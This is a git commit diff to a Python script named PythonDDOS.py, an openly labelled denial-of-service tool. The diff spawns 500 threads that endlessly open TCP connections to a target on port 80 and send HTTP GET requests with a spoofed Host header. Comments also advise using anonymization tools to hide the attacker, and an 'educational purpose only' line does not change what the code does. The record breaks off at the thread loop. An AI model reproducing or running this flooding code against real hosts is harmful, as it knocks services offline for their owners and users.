837d7b86982752a5cfdde04fa44aa242052c9b50
Sharan541 <154571600+Sharan541@users.noreply.github.com>
2024-02-19 00:05:29 +0530

    Update PythonDDOS.py

--- PythonDDOS.py
+++ PythonDDOS.py
@@ -1,31 +1,24 @@
 #DDOS with Python:
-#-------------------------------------
+# for educational purpose only
 import threading
 import socket
-# python doesnt do multi threading. it is simulated multithreading in python. changes threads simultaneously.
-target = '10.0.0.19'
-#DDOS an ipaddress or a domain name. your router, your website, your PC, run apache server, do it.
-# ddos port 22 = ssh service. 80 = web service down.
+# no multi threading in py. simulated by changing threads simultaneously.
+target = '127.0.0.1'
+#DDOS an ipaddress or a domain name.
 port = 80
 #anonymization tools needed. fake ip for header not enough.
 fake_ip = '182.21.20.32'
 #not an attack but endless loop of a socket connection
-#already_connected = 0---
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        #afinet is creating a new socket. socstream for tcp
+        #afinet is creating a new socket. socstream for tcp = internet connection.
         s.connect((target, port))
         #send header.
         s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
         #get/ target, specify http version. encode them and send to port of target
         s.sendto(("Host: "+ fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         s.close()
-
-        #global already_connected---
-        #already_connected +=1---
-        #print(already_connected)---
-        #connect, send, close
 #to run in multiple threads
 for i in range(500):
     thread = threading.Thread(target=attack)
